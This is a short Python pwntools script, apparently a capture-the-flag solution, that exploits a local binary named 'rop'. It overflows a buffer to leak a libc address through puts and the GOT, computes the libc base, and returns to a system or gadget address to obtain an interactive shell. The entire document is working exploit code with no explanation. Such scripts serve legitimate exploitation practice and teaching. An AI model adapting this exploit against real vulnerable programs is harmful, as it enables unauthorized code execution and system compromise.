from pwn import *
io=process("./rop")
#gdb.attach(io)
io.recvuntil("something ..")
puts=0x08049050
got=0x0804c018
main=0x080491df
#main=0x080491e3
payload="a"*18+p32(puts)+p32(main)+p32(got)
io.sendline(payload)
io.recv()
leak=io.recv(4)
print len(leak)
#leak=leak+"\x00\x00"
leak=u32(leak)
print hex(leak)
base=leak-0x1e660
system=base+0x13e211
io.recvuntil("something ..")
io.sendline("a"*18+p32(system))
io.interactive()
